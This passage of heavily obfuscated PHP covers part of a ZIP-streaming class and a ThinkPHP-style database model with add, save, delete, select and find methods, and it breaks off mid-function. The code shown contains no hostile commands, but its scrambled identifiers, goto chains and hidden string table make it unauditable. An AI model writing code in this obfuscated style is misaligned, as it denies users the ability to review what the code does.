static::CDR_EOF_SIGNATURE), array($dºŒ•ÛàØö[1982], 0), array($dºŒ•ÛàØö[1982], 0), array($dºŒ•ÛàØö[1982], $eãŠ Ÿ ë¸), array($dºŒ•ÛàØö[1982], $eãŠ Ÿ ë¸), array($dºŒ•ÛàØö[1981], 4294967295), array($dºŒ•ÛàØö[1981], 4294967295), array($dºŒ•ÛàØö[1982], strlen($EÇ‘…Í•Û))); goto b›‰©ÃÄ“Ÿ; b›‰©ÃÄ“Ÿ: $a¥»ˆ‡§Î¥ = $this->packFields($eê¬ÈÚİ×) . $EÇ‘…Í•Û; $this->send($a¥»ˆ‡§Î¥); goto Bœİ”—õ²À; CªÂã°¡ƒâ: $dºŒ•ÛàØö =& $_SERVER[»„]; $eãŠ Ÿ ë¸ = count($this->files); $D„®âÊ™  = $this->cdr_ofs; goto D¦´Öô‚®©; Bœİ”—õ²À: } protected function addCdr() { foreach ($this->files as $d»ÆğÆÜˆ‡) { $this->addCdrFile($d»ÆğÆÜˆ‡); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $aôĞªÂ¾¹ù =& $_SERVER[»„]; $Bµ„±ÄÎÆ¤ = $aôĞªÂ¾¹ù[198]; if ($this->outputName) { $c±©ïĞî¶´ = trim(str_replace(array($aôĞªÂ¾¹ù[112], $aôĞªÂ¾¹ù[55], $aôĞªÂ¾¹ù[93], $aôĞªÂ¾¹ù[67], $aôĞªÂ¾¹ù[213], $aôĞªÂ¾¹ù[980]), $aôĞªÂ¾¹ù[33], $this->outputName)); $bê²éê‡º = rawurlencode($c±©ïĞî¶´); $Bµ„±ÄÎÆ¤ .= "\x3b\40\146\x69\154\145\156\x61\155\145\x2a\x3d\x75\164\146\x2d\70\x27\47{$bê²éê‡º}"; } $Eã…„”å‘’ = array($aôĞªÂ¾¹ù[195] => $aôĞªÂ¾¹ù[1984], $aôĞªÂ¾¹ù[1985] => $Bµ„±ÄÎÆ¤, $aôĞªÂ¾¹ù[1986] => $aôĞªÂ¾¹ù[1987], $aôĞªÂ¾¹ù[1988] => $aôĞªÂ¾¹ù[1989], $aôĞªÂ¾¹ù[1990] => $aôĞªÂ¾¹ù[1991]); foreach ($Eã…„”å‘’ as $F£ÌÎÒó¾™ => $C¶ÃíßÓÓ«) { header($F£ÌÎÒó¾™ . $aôĞªÂ¾¹ù[870] . $C¶ÃíßÓÓ«); } } protected function send($d”Ïšç³ƒÆ) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $d”Ïšç³ƒÆ); } protected final function dosTime($fÕî„‹Üå) { $E­øëÌÓ´ =& $_SERVER[»„]; $fÄÈÌİÃöÃ = getdate($fÕî„‹Üå); if ($fÄÈÌİÃöÃ[$E­øëÌÓ´[1694]] < 1980) { $fÄÈÌİÃöÃ = array($E­øëÌÓ´[1694] => 1980, $E­øëÌÓ´[1992] => 1, $E­øëÌÓ´[1993] => 1, $E­øëÌÓ´[1994] => 0, $E­øëÌÓ´[1995] => 0, $E­øëÌÓ´[1996] => 0); } $fÄÈÌİÃöÃ[$E­øëÌÓ´[1694]] -= 1980; return $fÄÈÌİÃöÃ[$E­øëÌÓ´[1694]] << 25 | $fÄÈÌİÃöÃ[$E­øëÌÓ´[1992]] << 21 | $fÄÈÌİÃöÃ[$E­øëÌÓ´[1993]] << 16 | $fÄÈÌİÃöÃ[$E­øëÌÓ´[1994]] << 11 | $fÄÈÌİÃöÃ[$E­øëÌÓ´[1995]] << 5 | $fÄÈÌİÃöÃ[$E­øëÌÓ´[1996]] >> 1; } protected function packFields($F§¢™î©ÈÖ) { $aŠÛ·÷Ò¡ =& $_SERVER[»„]; $D˜‹ÓØ½”“ = $aŠÛ·÷Ò¡[33]; $DÀ‚½À‘ß“ = array(); foreach ($F§¢™î©ÈÖ as $fÒŞ¡–æõà) { $D˜‹ÓØ½”“ .= $fÒŞ¡–æõà[0]; $DÀ‚½À‘ß“[] = $fÒŞ¡–æõà[1]; } array_unshift($DÀ‚½À‘ß“, $D˜‹ÓØ½”“); return call_user_func_array($aŠÛ·÷Ò¡[1997], $DÀ‚½À‘ß“); } protected function filterFilename($Dø¥¾±“ÄÌ) { $c¢íœÕ™³ =& $_SERVER[»„]; return str_replace(array($c¢íœÕ™³[93], $c¢íœÕ™³[4], $c¢íœÕ™³[172], $c¢íœÕ™³[69], $c¢íœÕ™³[112], $c¢íœÕ™³[915], $c¢íœÕ™³[918], $c¢íœÕ™³[267]), $c¢íœÕ™³[70], $Dø¥¾±“ÄÌ); } } goto F­÷ï‹åå¼; f´™‚»çÈ: define($_SERVER[»„][226], 0); define($_SERVER[»„][227], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\142\154\145", "\x6f\x72\x64\x65\162", "\x61\154\151\x61\x73", "\x68\x61\166\151\x6e\147", "\147\x72\x6f\165\160", "\154\x6f\x63\153", "\x64\151\163\x74\151\x6e\x63\164", "\x61\x75\x74\157", "\146\151\x6c\x74\x65\162", "\166\x61\x6c\151\x64\141\x74\145", "\162\145\163\165\154\x74", "\142\151\156\144", "\x74\x6f\x6b\x65\x6e"); public function __construct($B‹îêÚÁÃ¤ = '', $bŞÏÔ ÂÒå = '', $bïß‚©ğ£• = '') { $EÅœ‡È‰Àù =& $_SERVER[»„]; $this->_initialize(); if (!empty($B‹îêÚÁÃ¤)) { if (strpos($B‹îêÚÁÃ¤, $EÅœ‡È‰Àù[91])) { list($this->dbName, $this->name) = explode($EÅœ‡È‰Àù[91], $B‹îêÚÁÃ¤); } else { $this->name = $B‹îêÚÁÃ¤; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($bŞÏÔ ÂÒå)) { $this->tablePrefix = $EÅœ‡È‰Àù[33]; } elseif ($EÅœ‡È‰Àù[33] != $bŞÏÔ ÂÒå) { $this->tablePrefix = $bŞÏÔ ÂÒå; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($EÅœ‡È‰Àù[228]); } $this->db(0, empty($this->connection) ? $bïß‚©ğ£• : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $fßˆ¬âëŒ± =& $_SERVER[»„]; if (empty($this->fields)) { if (think_config($fßˆ¬âëŒ±[229])) { $f¶õÜ™èÏ = $this->dbName ? $this->dbName : think_config($fßˆ¬âëŒ±[230]); $eÊ¯—×ŠôÏ = think_var_cache($fßˆ¬âëŒ±[231] . strtolower(get_path_this($f¶õÜ™èÏ) . $fßˆ¬âëŒ±[91] . $this->name)); if ($eÊ¯—×ŠôÏ) { $eÖÖŒ„ç» = think_config($fßˆ¬âëŒ±[232]); if (empty($eÖÖŒ„ç») || $eÊ¯—×ŠôÏ[$fßˆ¬âëŒ±[233]] == $eÖÖŒ„ç») { $this->fields = $eÊ¯—×ŠôÏ; return; } } } $this->flush(); } } public function flush() { goto c©Ñ£‹æ®; eíÆçŒš: foreach ($DøÂÚÁĞ×Ì as $dÎ¦ÜÆµò» => $cˆƒóä–ß™) { $F±¼ÏĞùÕ¼[$dÎ¦ÜÆµò»] = $cˆƒóä–ß™[$FÚãÅö˜ó [29]]; if ($cˆƒóä–ß™[$FÚãÅö˜ó [36]]) { $this->fields[$FÚãÅö˜ó [235]] = $dÎ¦ÜÆµò»; if ($cˆƒóä–ß™[$FÚãÅö˜ó [39]]) { $this->fields[$FÚãÅö˜ó [234]] = !0; } } } $this->fields[$FÚãÅö˜ó [236]] = $F±¼ÏĞùÕ¼; if (think_config($FÚãÅö˜ó [232])) { $this->fields[$FÚãÅö˜ó [233]] = think_config($FÚãÅö˜ó [232]); } goto b†ºÜÅÔ‚½; fã½²®ø®È: if (!$DøÂÚÁĞ×Ì) { return !1; } $this->fields = array_keys($DøÂÚÁĞ×Ì); $this->fields[$FÚãÅö˜ó [234]] = !1; goto eíÆçŒš; c©Ñ£‹æ®: $FÚãÅö˜ó  =& $_SERVER[»„]; $this->db->setModel($this->name); $DøÂÚÁĞ×Ì = $this->db->getFields($this->getTableName()); goto fã½²®ø®È; b†ºÜÅÔ‚½: if (think_config($FÚãÅö˜ó [229])) { $eã’óŸ£˜® = $this->dbName ? $this->dbName : think_config($FÚãÅö˜ó [230]); think_var_cache($FÚãÅö˜ó [231] . strtolower(get_path_this($eã’óŸ£˜®) . $FÚãÅö˜ó [91] . $this->name), $this->fields); } goto FÂïœÛ»¾; FÂïœÛ»¾: } public function switchModel($EŞÀ±á©²×, $eá®â†à”ƒ = array()) { $a—Ò±ô™Ûİ =& $_SERVER[»„]; $A²Í×Í²ø = ucwords(strtolower($EŞÀ±á©²×)) . $a—Ò±ô™Ûİ[237]; if (!class_exists($A²Í×Í²ø)) { think_exception($A²Í×Í²ø . think_lang($a—Ò±ô™Ûİ[238])); } $this->_extModel = new $A²Í×Í²ø($this->name); if (!empty($eá®â†à”ƒ)) { foreach ($eá®â†à”ƒ as $A¦²åö®·Ä) { $this->_extModel->setProperty($A¦²åö®·Ä, $this->{$A¦²åö®·Ä}); } } return $this->_extModel; } public function __set($AñÙŸ ¸ÓŠ, $Fßñõ‘®ù¾) { $this->data[$AñÙŸ ¸ÓŠ] = $Fßñõ‘®ù¾; } public function __get($Dƒ¸´Ğªğ·) { return isset($this->data[$Dƒ¸´Ğªğ·]) ? $this->data[$Dƒ¸´Ğªğ·] : null; } public function __isset($AĞ’‚î) { return isset($this->data[$AĞ’‚î]); } public function __unset($cßÓ¨ç¯ì¸) { unset($this->data[$cßÓ¨ç¯ì¸]); } public function __call($dÆßŞÙ‚‡×, $aÑÛ÷©ß¹ç) { $f£òé˜ª² =& $_SERVER[»„]; if (in_array(strtolower($dÆßŞÙ‚‡×), $this->methods, !0)) { $this->options[strtolower($dÆßŞÙ‚‡×)] = $aÑÛ÷©ß¹ç[0]; return $this; } elseif (in_array(strtolower($dÆßŞÙ‚‡×), array($f£òé˜ª²[239], $f£òé˜ª²[240], $f£òé˜ª²[241], $f£òé˜ª²[242], $f£òé˜ª²[243]), !0)) { $F¸ßë×ÈğÏ = isset($aÑÛ÷©ß¹ç[0]) ? $aÑÛ÷©ß¹ç[0] : $f£òé˜ª²[172]; $F¸ßë×ÈğÏ = $this->db->parseKey($F¸ßë×ÈğÏ); return $this->getField(strtoupper($dÆßŞÙ‚‡×) . $f£òé˜ª²[244] . $F¸ßë×ÈğÏ . $f£òé˜ª²[245] . $dÆßŞÙ‚‡×, $f£òé˜ª²[239]); } elseif (strtolower(substr($dÆßŞÙ‚‡×, 0, 5)) == $f£òé˜ª²[246]) { $F¸ßë×ÈğÏ = think_parse_name(substr($dÆßŞÙ‚‡×, 5)); $A”ÆÖˆ«áÉ[$F¸ßë×ÈğÏ] = $aÑÛ÷©ß¹ç[0]; return $this->where($A”ÆÖˆ«áÉ)->find(); } elseif (strtolower(substr($dÆßŞÙ‚‡×, 0, 10)) == $f£òé˜ª²[247]) { $e†äØø¯åª = think_parse_name(substr($dÆßŞÙ‚‡×, 10)); $A”ÆÖˆ«áÉ[$e†äØø¯åª] = $aÑÛ÷©ß¹ç[0]; return $this->where($A”ÆÖˆ«áÉ)->getField($aÑÛ÷©ß¹ç[1]); } elseif (isset($this->_scope[$dÆßŞÙ‚‡×])) { return $this->scope($dÆßŞÙ‚‡×, $aÑÛ÷©ß¹ç[0]); } elseif (method_exists($this, $dÆßŞÙ‚‡×)) { array_unshift($aÑÛ÷©ß¹ç, $dÆßŞÙ‚‡×); return call_user_func_array(array($this, $f£òé˜ª²[248]), $aÑÛ÷©ß¹ç); } else { return call_user_func_array(array(parent, $dÆßŞÙ‚‡×), $aÑÛ÷©ß¹ç); } } protected function call() { goto añòÌ˜ºˆ; añòÌ˜ºˆ: $a´ôæó¦Û² =& $_SERVER[»„]; $Dò‡ôÈÛå¡ = func_get_args(); $FŸêäŠ°Ê… = array_shift($Dò‡ôÈÛå¡); goto Bæó…øÃï”; bÌˆ»çÎ¿º: if (isset($Dò‡ôÈÛå¡[$CÏµ„–»éª]) && $Dò‡ôÈÛå¡[$CÏµ„–»éª] === $FŸêäŠ°Ê…) { think_exception(__CLASS__ . $a´ôæó¦Û²[4] . $FŸêäŠ°Ê… . think_lang($a´ôæó¦Û²[249])); return; } $Dò‡ôÈÛå¡[] = $FŸêäŠ°Ê…; if (method_exists($this, $a´ôæó¦Û²[250])) { $C¸ŠëˆÎö = call_user_func_array(array($this, $a´ôæó¦Û²[251]), array($B˜İïôĞ©Ä, $Dò‡ôÈÛå¡)); if (!is_null($C¸ŠëˆÎö) && $C¸ŠëˆÎö !== !1) { return $C¸ŠëˆÎö; } } goto CÇ †ô±Š; Bæó…øÃï”: $B˜İïôĞ©Ä = $FŸêäŠ°Ê…; if (is_array($FŸêäŠ°Ê…)) { $B˜İïôĞ©Ä = $FŸêäŠ°Ê…[1]; $FŸêäŠ°Ê… = $FŸêäŠ°Ê…[0]; } $CÏµ„–»éª = count($Dò‡ôÈÛå¡) - 1; goto bÌˆ»çÎ¿º; CÇ †ô±Š: $dù¢í¢Æªİ = call_user_func_array(array($this, $FŸêäŠ°Ê…), $Dò‡ôÈÛå¡); if (method_exists($this, $a´ôæó¦Û²[252])) { $C¸ŠëˆÎö = call_user_func_array(array($this, $a´ôæó¦Û²[253]), array($B˜İïôĞ©Ä, $Dò‡ôÈÛå¡, $dù¢í¢Æªİ)); if ($C¸ŠëˆÎö) { return $C¸ŠëˆÎö; } } return $dù¢í¢Æªİ; goto eê„òèó‘¡; eê„òèó‘¡: } protected function _initialize() { } protected function _facade($C¢ŠµØ¿íİ) { $d¬²Æëã­ =& $_SERVER[»„]; if (!empty($this->fields)) { foreach ($C¢ŠµØ¿íİ as $aŒ›â…ç‘ => $Bö±ÉâÑº) { if (!in_array($aŒ›â…ç‘, $this->fields, !0)) { unset($C¢ŠµØ¿íİ[$aŒ›â…ç‘]); } elseif (is_scalar($Bö±ÉâÑº)) { $this->_parseType($C¢ŠµØ¿íİ, $aŒ›â…ç‘); } } } if (!empty($this->options[$d¬²Æëã­[254]])) { $C¢ŠµØ¿íİ = array_map($this->options[$d¬²Æëã­[254]], $C¢ŠµØ¿íİ); unset($this->options[$d¬²Æëã­[254]]); } $this->_beforeWrite($C¢ŠµØ¿íİ); return $C¢ŠµØ¿íİ; } protected function _beforeWrite(&$Díô½â¡) { } public function add($cªÁâ¼í” = '', $b˜æ™ŞÂÌ = array(), $eáâÉöŒ— = false) { goto d¦áÖ±Áª½; Dù ½Ê¹ö: return $cÙ±‡Ëßœ; goto D°ª«²õÔƒ; bœÇ‘—É¹Ï: if (!1 === $this->_beforeInsert($cªÁâ¼í”, $b˜æ™ŞÂÌ)) { return !1; } $cÙ±‡Ëßœ = $this->db->insert($cªÁâ¼í”, $b˜æ™ŞÂÌ, $eáâÉöŒ—); if (!1 !== $cÙ±‡Ëßœ) { $BÒ“Îí = $this->getLastInsID(); if ($BÒ“Îí) { $cªÁâ¼í”[$this->getPk()] = $BÒ“Îí; $this->_after_insert($cªÁâ¼í”, $b˜æ™ŞÂÌ); return $BÒ“Îí; } $this->_after_insert($cªÁâ¼í”, $b˜æ™ŞÂÌ); } goto Dù ½Ê¹ö; d¦áÖ±Áª½: if (empty($cªÁâ¼í”)) { if (!empty($this->data)) { $cªÁâ¼í” = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[»„][255]); return !1; } } $b˜æ™ŞÂÌ = $this->_parseOptions($b˜æ™ŞÂÌ); $cªÁâ¼í” = $this->_facade($cªÁâ¼í”); goto bœÇ‘—É¹Ï; D°ª«²õÔƒ: } protected function _beforeInsert(&$A•Œ§­°², $F‰Š®Ì‚©ß) { } protected function _after_insert($d¸Ä©Ò­Ÿ, $A‚‚Î¬×‘Œ) { } public function addAll($d¶±ğ•¾Ší, $C™íÁñ‚ï“ = array(), $fµù¾²²Ù— = false) { goto A¥ÚÂÛíŒ; F˜‰Ù¯¬å¹: return $C‹ìŞÔ‹Ş; goto açÜ­Ë¥˜»; A¥ÚÂÛíŒ: $CŒìÍÁ¾Ìİ =& $_SERVER[»„]; if (empty($d¶±ğ•¾Ší)) { $this->error = think_lang($CŒìÍÁ¾Ìİ[255]); return !1; } $C™íÁñ‚ï“ = $this->_parseOptions($C™íÁñ‚ï“); goto C‡Î»è; C‡Î»è: foreach ($d¶±ğ•¾Ší as $d¯Š©â˜…Á => $f–ªôÓ¯²Ã) { $d¶±ğ•¾Ší[$d¯Š©â˜…Á] = $this->_facade($f–ªôÓ¯²Ã); } if (method_exists($this->db, $CŒìÍÁ¾Ìİ[256])) { $C‹ìŞÔ‹Ş = $this->db->insertAll($d¶±ğ•¾Ší, $C™íÁñ‚ï“, $fµù¾²²Ù—); } else { $this->startTrans(); foreach ($d¶±ğ•¾Ší as $d¯Š©â˜…Á => $f–ªôÓ¯²Ã) { $C‹ìŞÔ‹Ş = $this->db->insert($f–ªôÓ¯²Ã, $C™íÁñ‚ï“, $fµù¾²²Ù—); } $this->commit(); } if (!1 !== $C‹ìŞÔ‹Ş) { $c ‹ª’ã = $this->getLastInsID(); if ($c ‹ª’ã) { return $c ‹ª’ã; } } goto F˜‰Ù¯¬å¹; açÜ­Ë¥˜»: } public function selectAdd($Cª…ÇƒÎß = '', $fÁ´‹î†Ÿ = '', $AÄ«šĞøñŞ = array()) { $cíÙÇªÁ¾æ =& $_SERVER[»„]; $AÄ«šĞøñŞ = $this->_parseOptions($AÄ«šĞøñŞ); if (!1 === ($Cë–Ÿø»’ç = $this->db->selectInsert($Cª…ÇƒÎß ? $Cª…ÇƒÎß : $AÄ«šĞøñŞ[$cíÙÇªÁ¾æ[257]], $fÁ´‹î†Ÿ ? $fÁ´‹î†Ÿ : $this->getTableName(), $AÄ«šĞøñŞ))) { $this->error = think_lang($cíÙÇªÁ¾æ[258]); return !1; } else { return $Cë–Ÿø»’ç; } } public function save($Cº‡‚õ§Ø = '', $cæÙ„ÜÊ•’ = array()) { goto cğäÑ¹‰øŠ; cğäÑ¹‰øŠ: $c¯ÃñÙ¹Õ =& $_SERVER[»„]; if (empty($Cº‡‚õ§Ø)) { if (!empty($this->data)) { $Cº‡‚õ§Ø = $this->data; $this->data = array(); } else { $this->error = think_lang($c¯ÃñÙ¹Õ[255]); return !1; } } $Cº‡‚õ§Ø = $this->_facade($Cº‡‚õ§Ø); goto Béµõ£â–; Cİª‚Çƒí: if (!1 !== $dõ„ë¬‘òÂ) { if (isset($FÉ…ÏÓ¹„)) { $Cº‡‚õ§Ø[$F³ï«Ú°ˆ] = $FÉ…ÏÓ¹„; } $this->_afterUpdate($Cº‡‚õ§Ø, $cæÙ„ÜÊ•’); } return $dõ„ë¬‘òÂ; goto B–´¯…ˆ; Eó¢ˆ÷©ã™: if (is_array($cæÙ„ÜÊ•’[$c¯ÃñÙ¹Õ[259]]) && isset($cæÙ„ÜÊ•’[$c¯ÃñÙ¹Õ[259]][$F³ï«Ú°ˆ])) { $FÉ…ÏÓ¹„ = $cæÙ„ÜÊ•’[$c¯ÃñÙ¹Õ[259]][$F³ï«Ú°ˆ]; } if (!1 === $this->_beforeUpdate($Cº‡‚õ§Ø, $cæÙ„ÜÊ•’)) { return !1; } $dõ„ë¬‘òÂ = $this->db->update($Cº‡‚õ§Ø, $cæÙ„ÜÊ•’); goto Cİª‚Çƒí; Béµõ£â–: $cæÙ„ÜÊ•’ = $this->_parseOptions($cæÙ„ÜÊ•’); $F³ï«Ú°ˆ = $this->getPk(); if (!isset($cæÙ„ÜÊ•’[$c¯ÃñÙ¹Õ[259]])) { if (isset($Cº‡‚õ§Ø[$F³ï«Ú°ˆ])) { $d‘¨Œ…Ú±Ò[$F³ï«Ú°ˆ] = $Cº‡‚õ§Ø[$F³ï«Ú°ˆ]; $cæÙ„ÜÊ•’[$c¯ÃñÙ¹Õ[259]] = $d‘¨Œ…Ú±Ò; unset($Cº‡‚õ§Ø[$F³ï«Ú°ˆ]); } else { $this->error = think_lang($c¯ÃñÙ¹Õ[258]); return !1; } } goto Eó¢ˆ÷©ã™; B–´¯…ˆ: } protected function _beforeUpdate(&$Dæéß¿Òò“, $EÌ‰ÚŞ•Øê) { } protected function _afterUpdate($e›‡¾ĞÛô, $d¬„Ù¨¨Æ—) { } public function delete($bŠ•¦ î´ = array()) { goto d¯©¯·Ş; bîÏ‡ŠĞÙ: $eˆòÌäöĞ = $this->db->delete($bŠ•¦ î´); if (!1 !== $eˆòÌäöĞ) { $fœØŠÌ˜ÂÄ = array(); if (isset($a½îÒšİ‡ò)) { $fœØŠÌ˜ÂÄ[$B¤Ô§µáËÍ] = $a½îÒšİ‡ò; } $this->_after_delete($fœØŠÌ˜ÂÄ, $bŠ•¦ î´); } return $eˆòÌäöĞ; goto eƒ¶ãÜ½¼©; d¯©¯·Ş: $e‚Œ„Ü›‡¤ =& $_SERVER[»„]; if (empty($bŠ•¦ î´) && empty($this->options[$e‚Œ„Ü›‡¤[259]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $B¤Ô§µáËÍ = $this->getPk(); goto CÌšª‰Â•í; CÌšª‰Â•í: if (is_numeric($bŠ•¦ î´) || is_string($bŠ•¦ î´)) { if (strpos($bŠ•¦ î´, $e‚Œ„Ü›‡¤[47])) { $CÛïÖó·Ö[$B¤Ô§µáËÍ] = array($e‚Œ„Ü›‡¤[260], $bŠ•¦ î´); } else { $CÛïÖó·Ö[$B¤Ô§µáËÍ] = $bŠ•¦ î´; } $this->options[$e‚Œ„Ü›‡¤[259]] = $CÛïÖó·Ö; } $bŠ•¦ î´ = $this->_parseOptions(); if (is_array($bŠ•¦ î´[$e‚Œ„Ü›‡¤[259]]) && isset($bŠ•¦ î´[$e‚Œ„Ü›‡¤[259]][$B¤Ô§µáËÍ])) { $a½îÒšİ‡ò = $bŠ•¦ î´[$e‚Œ„Ü›‡¤[259]][$B¤Ô§µáËÍ]; } goto bîÏ‡ŠĞÙ; eƒ¶ãÜ½¼©: } protected function _after_delete($A‰ìËíôß÷, $AìµÔõ·ƒÜ) { } public function select($Bâ©Ù²Å« = array()) { goto bµËò…îªé; bÓ‡”¢Ã: $F±¹‰¥œ‹Ä = $this->db->select($Bâ©Ù²Å«); if (!1 === $F±¹‰¥œ‹Ä) { return !1; } if (empty($F±¹‰¥œ‹Ä)) { return null; } goto a½îÛ½Äø; bµËò…îªé: $E…Ç‘¯¶Å =& $_SERVER[»„]; if (is_string($Bâ©Ù²Å«) || is_numeric($Bâ©Ù²Å«)) { $fÖ–âå²§Å = $this->getPk(); if (strpos($Bâ©Ù²Å«, $E…Ç‘¯¶Å[47])) { $FÅ—–Î¡íâ[$fÖ–âå²§Å] = array($E…Ç‘¯¶Å[260], $Bâ©Ù²Å«); } else { $FÅ—–Î¡íâ[$fÖ–âå²§Å] = $Bâ©Ù²Å«; } $this->options[$E…Ç‘¯¶Å[259]] = $FÅ—–Î¡íâ; } elseif (!1 === $Bâ©Ù²Å«) { $Bâ©Ù²Å« = $this->_parseOptions(); return $E…Ç‘¯¶Å[261] . $this->db->buildSelectSql($Bâ©Ù²Å«) . $E…Ç‘¯¶Å[262]; } $Bâ©Ù²Å« = $this->_parseOptions(); goto bÓ‡”¢Ã; a½îÛ½Äø: $this->_afterSelect($F±¹‰¥œ‹Ä, $Bâ©Ù²Å«); return $F±¹‰¥œ‹Ä; goto dØ‹·¯ù°; dØ‹·¯ù°: } protected function _afterSelect(&$EÄªŒéÏÀĞ, $BÆ‹¤ˆŸ¡Ã) { } public function buildSql($A÷ø¤¦‹‘ = array()) { $d«¨öáÅ =& $_SERVER[»„]; $A÷ø¤¦‹‘ = $this->_parseOptions($A÷ø¤¦‹‘); return $d«¨öáÅ[261] . $this->db->buildSelectSql($A÷ø¤¦‹‘) . $d«¨öáÅ[262]; } public function optionsValue($EæªŒƒ÷ë™ = null) { if (is_null($EæªŒƒ÷ë™)) { return $this->options; } elseif (is_array($EæªŒƒ÷ë™)) { $this->options = array_merge($this->options, $EæªŒƒ÷ë™); } } protected function _parseOptions($fãë±¼ëØÊ = array()) { goto a¨­Ø×™ÈÚ; D‡ØÜÃªĞ‘: if (isset($fãë±¼ëØÊ[$bé²Áõ²÷Ï[259]]) && is_array($fãë±¼ëØÊ[$bé²Áõ²÷Ï[259]]) && !empty($e³§Î‹Ü‡²) && !isset($fãë±¼ëØÊ[$bé²Áõ²÷Ï[266]]) && !isset($fãë±¼ëØÊ[$bé²Áõ²÷Ï[263]])) { foreach ($fãë±¼ëØÊ[$bé²Áõ²÷Ï[259]] as $f¯õÑ·â => $B½‹ÀÏí¢) { $f¯õÑ·â = trim($f¯õÑ·â); if (in_array($f¯õÑ·â, $e³§Î‹Ü‡², !0)) { if (is_scalar($B½‹ÀÏí¢)) { $this->_parseType($fãë±¼ëØÊ[$bé²Áõ²÷Ï[259]], $f¯õÑ·â); } } elseif (!is_numeric($f¯õÑ·â) && $bé²Áõ²÷Ï[70] != substr($f¯õÑ·â, 0, 1) && !1 === strpos($f¯õÑ·â, $bé²Áõ²÷Ï[91]) && !1 === strpos($f¯õÑ·â, $bé²Áõ²÷Ï[244]) && !1 === strpos($f¯õÑ·â, $bé²Áõ²÷Ï[267]) && !1 === strpos($f¯õÑ·â, $bé²Áõ²÷Ï[268])) { unset($fãë±¼ëØÊ[$bé²Áõ²÷Ï[259]][$f¯õÑ·â]); } } } $this->_options_filter($fãë±¼ëØÊ); return $fãë±¼ëØÊ; goto aëÈíÓªé; a¨­Ø×™ÈÚ: $bé²Áõ²÷Ï =& $_SERVER[»„]; if (is_array($fãë±¼ëØÊ)) { $fãë±¼ëØÊ = array_merge($this->options, $fãë±¼ëØÊ); } $this->options = array(); goto Dí±µŸ¯ßÎ; Dí±µŸ¯ßÎ: if (!isset($fãë±¼ëØÊ[$bé²Áõ²÷Ï[263]])) { $fãë±¼ëØÊ[$bé²Áõ²÷Ï[263]] = $this->getTableName(); $e³§Î‹Ü‡² = $this->fields; } else { $e³§Î‹Ü‡² = $this->getDbFields(); } if (!empty($fãë±¼ëØÊ[$bé²Áõ²÷Ï[264]])) { $fãë±¼ëØÊ[$bé²Áõ²÷Ï[263]] .= $bé²Áõ²÷Ï[50] . $fãë±¼ëØÊ[$bé²Áõ²÷Ï[264]]; } $fãë±¼ëØÊ[$bé²Áõ²÷Ï[265]] = $this->name; goto D‡ØÜÃªĞ‘; aëÈíÓªé: } protected function _options_filter(&$A‘˜¤ÊçÊ) { } protected function _parseType(&$cœï…ƒ‚×á, $fÌàø™¶§) { $B·¿¬…™òÍ =& $_SERVER[»„]; if (empty($this->options[$B·¿¬…™òÍ[269]][$B·¿¬…™òÍ[4] . $fÌàø™¶§])) { $EÛØÎ©‰ƒç = strtolower($this->fields[$B·¿¬…™òÍ[236]][$fÌàø™¶§]); if (!1 !== strpos($EÛØÎ©‰ƒç, $B·¿¬…™òÍ[270])) { } elseif (!1 === strpos($EÛØÎ©‰ƒç, $B·¿¬…™òÍ[271]) && !1 !== strpos($EÛØÎ©‰ƒç, $B·¿¬…™òÍ[272])) { $cœï…ƒ‚×á[$fÌàø™¶§] = intval($cœï…ƒ‚×á[$fÌàø™¶§]); } elseif (!1 !== strpos($EÛØÎ©‰ƒç, $B·¿¬…™òÍ[273]) || !1 !== strpos($EÛØÎ©‰ƒç, $B·¿¬…™òÍ[274])) { $cœï…ƒ‚×á[$fÌàø™¶§] = floatval($cœï…ƒ‚×á[$fÌàø™¶§]); } elseif (!1 !== strpos($EÛØÎ©‰ƒç, $B·¿¬…™òÍ[275])) { $cœï…ƒ‚×á[$fÌàø™¶§] = (bool) $cœï…ƒ‚×á[$fÌàø™¶§]; } } } public function find($c„õÒ’á¢ä = array()) { goto D¦í¶ğ©´; B¹œÁßÍÌ´: $c„õÒ’á¢ä = $this->_parseOptions(); $F·Ì¯ÏàÖ¶ = $this->db->select($c„õÒ’á¢ä); if (!1 === $F·Ì¯ÏàÖ¶) { return !1; } goto eÀí¨ÉÃ‹‚; eÀí¨ÉÃ‹‚: if (empty($F·Ì¯ÏàÖ¶)) { return null; } $this->data = $F·Ì¯ÏàÖ¶[0]; $this->_afterFind($this->data, $c„õÒ’á¢ä); goto aÊğÛŒ®¹; D¦í¶ğ©´: $A¨ãã‹ŸÎ =& $_SERVER[»„]; if (is_numeric($c„õÒ’á¢ä) || is_string($c„õÒ’á¢ä)) { $f‡ ğğòˆå[$this->getPk()] = intval($c„õÒ’á¢ä); $this->options[$A¨ãã‹ŸÎ[259]] = $f‡ ğğòˆå; } $this->options[$A¨ãã‹ŸÎ[276]] = 1; goto B¹œÁßÍÌ´; aÊğÛŒ®¹: if (!empty($this->options[$A¨ãã‹ŸÎ[277]])) { return $this->returnResult($this->data, $this->options[$A¨ãã‹ŸÎ[277]]); } return $this->data; goto d÷‹†½Š˜ˆ; d÷‹†½Š˜ˆ: } protected function _afterFind(&$aØ•ÂäÆ‚, $CÃ¢­¡ „Š) { } protected function returnResult($c¬ÄÒŠÖîÙ, $fÉéìæÁìÇ = '') { $f’Û½ØÆ¦ =& $_SERVER[»„]; if ($fÉéìæÁìÇ) { if (is_callable($fÉéìæÁìÇ)) { return call_user_func($fÉéìæÁìÇ, $c¬ÄÒŠÖîÙ); } switch (strtolower($fÉéìæÁìÇ)) { case $f’Û½ØÆ¦[278]: return 